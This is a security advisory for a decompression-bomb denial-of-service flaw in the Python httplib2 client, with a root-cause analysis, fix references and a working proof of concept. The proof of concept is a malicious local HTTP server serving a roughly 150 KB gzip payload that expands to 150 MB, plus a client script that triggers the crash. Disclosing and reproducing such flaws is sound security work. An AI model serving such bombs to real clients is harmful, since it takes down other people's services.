# [H] httplib2: Decompression Bomb Denial of Service via Unbounded gzip/deflate Response Handling

## Summary
Severity: High
Advisory: GHSA-j5g9-f88f-gfj3
CVE: CVE-2026-59939
CWE: CWE-400, CWE-409, CWE-770
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-07-24
Source: https://github.com/advisories/GHSA-j5g9-f88f-gfj3
Type: github-advisory

## Affected
- PyPI: `httplib2` — affected >=0 <0.32.0

## Details
### Summary

The `httplib2` HTTP client library performs unbounded decompression of HTTP response bodies encoded with `Content-Encoding: gzip` or `deflate`. A malicious or compromised HTTP server can return a small compressed payload (approximately 150 KB) that expands to an arbitrarily large size in memory (150 MB or more), causing `MemoryError` or OOM-kill in the client process. This is a classic decompression bomb (zip bomb) attack against the HTTP client.

Any application using `httplib2.Http().request()` against untrusted or attacker-controlled HTTP endpoints is affected.

### Details

**Affected code:** `httplib2/__init__.py` - `_decompressContent()` function

The decompression path has two unbounded operations:

1. **gzip decompression** (line 394):
   ```python
   content = gzip.GzipFile(fileobj=io.BytesIO(new_content)).read()
   ```
   The `.read()` call with no size argument decompresses the entire gzip payload into a single in-memory bytes object. There is no limit on the decompressed size.

2. **deflate decompression** (line 397):
   ```python
   content = zlib.decompress(content, zlib.MAX_WBITS)
   ```
   Similarly, `zlib.decompress()` returns the fully decompressed content as a single bytes object with no size bound.

3. **Automatic invocation** (line 1431): `_decompressContent()` is called automatically on every HTTP response that includes a `Content-Encoding: gzip` or `deflate` header. The full compressed body is already buffered in memory via `response.read()` before decompression begins.

**Root cause:** There is no `max_decompressed_size`, streaming decompression with size tracking, or decompression ratio check anywhere in the decompression path. The library unconditionally trusts the server's compressed payload size.

**Attack vector:** Any HTTP server (including man-in-the-middle attackers or compromised upstream services) can trigger this by returning a response with:
- `Content-Encoding: gzip` header
- A small compressed body that decompresses to an arbitrarily large size

### Proof of Concept

**Step 1 - Start a malicious HTTP server that serves a gzip decompression bomb:**

```python
#!/usr/bin/env python3
"""Malicious HTTP server that serves a gzip decompression bomb."""
import gzip
import http.server
import io
import socketserver

UNCOMPRESSED_SIZE = 150 * 1024 * 1024  # 150 MB

def make_payload():
    """Create a gzip payload: ~150 KB compressed -> 150 MB decompressed."""
    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode="wb", compresslevel=9) as gz:
        chunk = b"A" * (1024 * 1024)  # 1 MB of repeating bytes
        for _ in range(UNCOMPRESSED_SIZE // len(chunk)):
            gz.write(chunk)
    return buf.getvalue()

PAYLOAD = make_payload()

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Encoding", "gzip")
        self.send_header("Content-Length", str(len(PAYLOAD)))
        self.end_headers()
        self.wfile.write(PAYLOAD)
    def log_message(self, fmt, *args):
        pass

with socketserver.TCPServer(("127.0.0.1", 8000), Handler) as httpd:
    print(f"Bomb server ready: {len(PAYLOAD)} bytes compressed -> "
          f"{UNCOMPRESSED_SIZE} bytes decompressed")
    httpd.serve_forever()
```

**Step 2 - Run the httplib2 client (in a separate terminal):**

```python
#!/usr/bin/env python3
"""Client that demonstrates MemoryError from httplib2 decompression bomb."""
import resource
import httplib2

# Set a 180 MB memory limit to make the crash deterministic
LIMIT_MB = 180
limit = LIMIT_MB * 1024 * 1024
resource.setrlimit(resource.RLIMIT_AS, (limit, limit))

http = httplib2.Http(timeout=5)
try:
    response, content = http.request("http://127.0.0.1:8000/")
    print(f"Unexpected success: received {len(content)} bytes")
except MemoryError:
    print(f"MemoryError confirmed: decompression bomb exhausted "
          f"{LIMIT_MB} MB memory limit")
    # This is the expected outcome - the 150 KB compressed payload
    # expanded to 150 MB during decompression, exceeding the limit.
```

**Expected output (client):**
```
MemoryError confirmed: decompression bomb exhausted 180 MB memory limit
```

**Reproduction metrics:**
- Compressed payload size: **152,908 bytes** (~150 KB)
- Decompressed size: **157,286,400 bytes** (150 MB)
- Amplification ratio: **~1,029x**
- Client memory limit: 180 MB -> `MemoryError` triggered during `gzip.GzipFile.read()`

### Impact

**Severity: High**

Any application using `httplib2` to make HTTP requests to untrusted servers is vulnerable. The attack requires no authentication, no special configuration, and no user interaction - the server simply returns a crafted gzip-compressed response.

| Parameter | Value |
|---|---|
| Compressed payload | ~150 KB |
| Decompressed size | 150 MB (configurable by attacker) |
| Amplification ratio | ~1,029x |
| Authentication required | None |
| User interaction required | None |
| Prerequisites | Client makes any HTTP request to attacker-controlled server |

**Real-world scenarios:**
- **Web scrapers/crawlers** that fetch pages from untrusted URLs
- **API clients** connecting to third-party services
- **Webhook handlers** that follow redirects to attacker-controlled endpoints
- **CI/CD pipelines** that download dependencies or artifacts over HTTP
- **Any MITM attacker** on an unencrypted HTTP connection can inject the compressed payload

**Impact scaling:** The attacker can create arbitrarily large decompression bombs. A 1 MB compressed payload can decompress to several gigabytes, guaranteeing OOM-kill on virtually any system. The attack is fully deterministic and requires only a single HTTP response.

**Downstream exposure:** `httplib2` is a widely used Python HTTP client library with millions of downloads. It is a dependency of Google's API client libraries (`google-api-python-client`, `google-auth-httplib2`), meaning applications using Google Cloud APIs may be indirectly affected if they process responses from untrusted intermediaries.

---
### Credit

Found by a security research team from the University of Sydney, focusing on detecting open source software vulnerabilities.
Liyi Zhou: https://lzhou1110.github.io/
Ziyue Wang: https://zyy0530.github.io/
Strick: https://str1ckl4nd.github.io/
Maurice: https://maurice.busystar.org/
Chenchen Yu: https://7thparkk.github.io/

## References
- https://github.com/httplib2/httplib2/security/advisories/GHSA-j5g9-f88f-gfj3
- https://nvd.nist.gov/vuln/detail/CVE-2026-59939
- https://github.com/httplib2/httplib2/commit/87581ad6cf752fe3da2090c59058261d2d00a427
- https://github.com/httplib2/httplib2
- https://github.com/httplib2/httplib2/releases/tag/v0.32.0
- https://github.com/pypa/advisory-database/tree/main/vulns/httplib2/PYSEC-2026-3444.yaml
- https://lists.debian.org/debian-lts-announce/2026/08/msg00039.html
